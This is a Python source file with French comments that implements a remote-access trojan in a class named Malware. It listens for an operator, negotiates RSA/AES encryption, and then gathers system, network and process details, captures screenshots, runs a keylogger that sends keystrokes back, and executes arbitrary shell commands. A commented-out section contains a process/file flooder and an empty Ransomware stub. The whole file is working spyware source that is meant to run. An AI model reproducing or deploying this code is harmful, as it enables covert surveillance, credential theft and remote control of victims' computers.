import pyscreeze, pyscreenshot, socket, os, time, logging, psutil, getpass, random
import pynput.keyboard
from Crypto.Cipher import AES
import os, sys, socket, subprocess as sp, platform, time, pyscreeze, pkg_resources, base64
import threading
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from Crypto import Random

from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.serialization import load_pem_private_key

# CONSTANTES
ENCODING = 'UTF-8'
BUFFERSIZE = 2048
TIME_OUT = 3
TMP = os.environ["TEMP"]


class Malware():

    def __init__(self):
        self.ip = ''
        self.port = 50001
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn = self.s
        self.addr = self.s
        self.KEY = ""
        self.KeyListener = pynput.keyboard.Listener(on_press=self.OnKeyboardEvent)
        self.Key = pynput.keyboard.Key

    def connect(self):
        self.s.bind((self.ip, self.port))
        print("En Attente du client...")  # DEBUG A SUPPRIMER
        self.s.listen(1)
        self.conn, self.addr = self.s.accept()
        print("Connexion établie avec le client")

    def disconnect(self):
        self.s.close()

    def load_key_private(self):
        with open("key_malware\\key_private_client.pem", 'rb') as pem_in:
            pemlines = pem_in.read()
        privkey = load_pem_private_key(pemlines, None, backend=default_backend())
        return privkey

    def init_AES(self):
        private_key = self.load_key_private()

        cipher_Key = self.conn.recv(BUFFERSIZE)
#        print('DEBUG', cipher_Key)
        self.KEY = private_key.decrypt(cipher_Key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                                algorithm=hashes.SHA256(),
                                                                label=None))
        self.KEY = self.KEY.decode(ENCODING)
#        print(self.KEY)

    def iv(self):
        return Random.new().read(AES.block_size)

    def do_encrypt(self, message):
        iv = self.iv()
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_CFB, iv)
#        print(message)
        cipherMessage = enc.encrypt(message)
#        print(cipherMessage)
        return iv + cipherMessage

    def do_decrypt(self, cipherMessage):
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_CFB, cipherMessage[:16])
        message = enc.decrypt(cipherMessage[16:])
        return message.decode(ENCODING, errors='ignore')

    def task(self):

        act = self.conn.recv(1024)
        act = self.do_decrypt(act)
#        print(act)

        while act != 'exit()':
            if act == 'getinfo':
                self.give_informations_system()
            if act == 'os':
                self.give_operating_system()
            elif act == 'cwd':
                self.give_current_working_directory()
            elif act[:2] == 'cd':
                self.change_current_directory(act)
            elif act == 'prtscr':
                self.give_print_screen()
            elif act == "keystart":
                self.keylogger("start")
            elif act == "keystop":
                self.keylogger("stop")
            elif act == "keydump":
                self.keylogger("dump")
            elif act == 'bat':
                proc = InifiteProcess()
                file = InfiniteFile()
                proc.start()
                file.start()
                proc.join()
                file.join()

            else:
                shell = Shell(self.conn, act, self.KEY)
                shell.return_result_cmd()

            act = self.conn.recv(1024)
            act = self.do_decrypt(act)
            print(act)

    def give_informations_system(self):
        msg_info_global = '\n'
        # D'après la DOC, la constante de l'OS est à TRUE et les autres à false
        if psutil.WINDOWS:
            systemeExploitation = "WINDOWS"
        elif psutil.LINUX:
            systemeExploitation = "LINUX"
        elif psutil.MACOS:
            systemeExploitation = "MACOS"
        username = getpass.getuser()
        hostname = socket.gethostname()
        processId = os.getpid()  # récupération de l'identifiant du processus Malware

        # Informations globales OS + HOSTNAME + USERNAME + PROCESSID
        msg_info_global += (f'###################### INFORMATIONS GLOBALES ###################### \n'
                            f'OS \t\t\t\t : {systemeExploitation}\n'
                            f'Hostname \t\t : {hostname} \n'
                            f'Utilisateur \t : {username} \n'
                            f'ID processus \t : {processId} \n')

        # Informations sur les disques connectés à l'ordinateur

        listeDisque = psutil.disk_partitions()
        msg_info_global += (f'###################### INFORMATIONS DISQUES ###################### \n')
        for elem in listeDisque:
            msg_info_global += (f'Lettre du disque : {elem[0]} \n'
                                f'Point d\'encrage : {elem[1]} \n'
                                f'Format du disque : {elem[2]} \n'
                                f'options ?? : {elem[3]} \n\n')

        msg_info_reseau = '\n'

        # INFORMATIONS RESEAUX... TOUTES LES CONNEXIONS ACTUELLES A LA MACHINE
        # Fichier : infoReseaux.log
        msg_info_reseau += (f'###################### INFORMATIONS RESEAUX ######################\n')
        # kind : inet, inet4, inet6, tcp, tcp4,tcp6, udp,udp4,udp6, unix, all
        for elem2 in psutil.net_connections(kind='all'):
            # 3:0 = adresse locale  , 3:1 = port local
            # 4:0 = adresse distante, 4:1 = port distant
            # 5   = Status de la connexion
            # /!\ Il peut ne pas y avoir d'adresse distante, dans quel cas on affiche uniquement l'adresse/port local.
            # Sinon, le 4eme élement est vide et on se retrouve avec un out of index.
            if not elem2[4]:
                msg_info_reseau += (f'Adresse : {elem2[3][0]}:{elem2[3][1]} | {elem2[5]}\n')
            else:
                msg_info_reseau += (
                    f'Adresse : {elem2[3][0]}:{elem2[3][1]} --> {elem2[4][0]}:{elem2[4][1]} | {elem2[5]}\n')

        # INFORMATIONS PROCESSUS... LISTE TOUS LES PROCESSUS ACTIFS POUR LE MOMENT
        msg_info_process = '\n'
        msg_info_process += (f'###################### INFORMATIONS PROCESSUS ######################\n')
        for proc in psutil.process_iter(attrs=['name', 'username', 'pid']):
            for item in proc.info:
                msg_info_process += (item + ' : ' + str(proc.info[item]) + '\t')
            msg_info_process += ('\n')  # Rajout un passage à la ligne pour la forme

        msg_final = msg_info_global + msg_info_reseau + msg_info_process + "EOD"
        self.conn.sendall(self.do_encrypt(msg_final.encode(ENCODING)))

    def give_operating_system(self):
        opSys = platform.system()
        self.conn.send(self.do_encrypt(opSys.encode(ENCODING)))

    def give_current_working_directory(self):
        cwd = os.getcwd()
        print('[DEBUG] Give CWD >', cwd)
        self.conn.send(self.do_encrypt(cwd.encode(ENCODING)))

    def change_current_directory(self, act):
        print('[DEBUG] Change Directory > ', act)
        cd = act.strip('cd ')
        try:
            os.chdir(cd)
        except:
            print('Adresse Introuvable')

    def give_print_screen(self):
        pyscreeze.screenshot(TMP + "/s.png")

        # Envoi les informations du screenshot
        self.conn.send(str.encode("Screenshot..." + "\n" + "Taille fichier: " + str(os.path.getsize(TMP + "/s.png"))
                                  + " bytes" + "\n" + "..."))
        objPic = open(TMP + "/s.png", "rb")
        time.sleep(1)
        self.conn.send(objPic.read())# Envoi l'image
        objPic.close()

    def keylogger(self, option):
        global strKeyLogs

        if option == "start":
            if not self.KeyListener.running:
                self.KeyListener.start()
                self.conn.send(self.do_encrypt("succes".encode(ENCODING)))
            else:
                self.conn.send(self.do_encrypt("error".encode(ENCODING)))

        elif option == "stop":
            if self.KeyListener.running:
                self.KeyListener.stop()
                threading.Thread.__init__(self.KeyListener)  # re-initialise le thread
                strKeyLogs = ""
                self.conn.send(self.do_encrypt("succes".encode(ENCODING)))
            else:
                self.conn.send(self.do_encrypt("error".encode(ENCODING)))

        elif option == "dump":
            if not self.KeyListener.running:
                self.conn.send(self.do_encrypt("error".encode(ENCODING)))
            else:
                if strKeyLogs == "":
                    self.conn.send(self.do_encrypt("error2".encode(ENCODING)))
                else:
                    time.sleep(0.2)
                    self.conn.send(self.do_encrypt(str(len(strKeyLogs)).encode(ENCODING)))# Envoi la taille
                    time.sleep(0.2)
                    self.conn.send(self.do_encrypt(strKeyLogs.encode(ENCODING)))# Envoi les infos

                    strKeyLogs = ""  # clear logs

    def OnKeyboardEvent(self, event):
        global strKeyLogs

        try:  # check to see if variable is defined
            strKeyLogs
        except NameError:
            strKeyLogs = ""

        if event == self.Key.backspace:
            strKeyLogs += " [Bck] "
        elif event == self.Key.tab:
            strKeyLogs += " [Tab] "
        elif event == self.Key.enter:
            strKeyLogs += "\n"
        elif event == self.Key.space:
            strKeyLogs += " "
        elif type(event) == self.Key:  # if the character is some other type of special key
            strKeyLogs += " [" + str(event)[4:] + "] "
        else:
            strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character

    def run(self):
        self.connect()
        self.init_AES()
        self.task()
        self.disconnect()


class Shell(Malware):

    def __init__(self, s, cmd, key):
        self.conn = s
        self.cmd = cmd
        self.KEY = key

    def return_result_cmd(self):
#       print('apres reception')
        sh = sp.Popen(self.cmd, shell=True, stdout=sp.PIPE,
                      stderr=sp.PIPE, stdin=sp.PIPE,
                      universal_newlines=True)
        out, err = sh.communicate()
        result = (out) + (err)
        self.conn.sendall(self.do_encrypt(result.encode(ENCODING)))


'''
class InifiteProcess(Thread):

    def __init__(self):
        Thread.__init__(self)
        self.lock = Lock()

    def run(self):
        iProc = 0

        while iProc < 5:
            self.lock.acquire()
            os.system("start cmd.exe")
            self.lock.release()
            iProc = iProc +1


class InfiniteFile(Thread):

    def __init__(self):
        Thread.__init__(self)
        self.lock = Lock()

    def run(self):
        iFile = 0
        nom = str(iFile)
        while iFile < 5:
            self.lock.acquire()
            os.system("md "+nom+".txt")
            self.lock.release()
            iFile = iFile+1
            nom = str(iFile)



class Ransomware():
    pass
'''

go = Malware()
go.run()

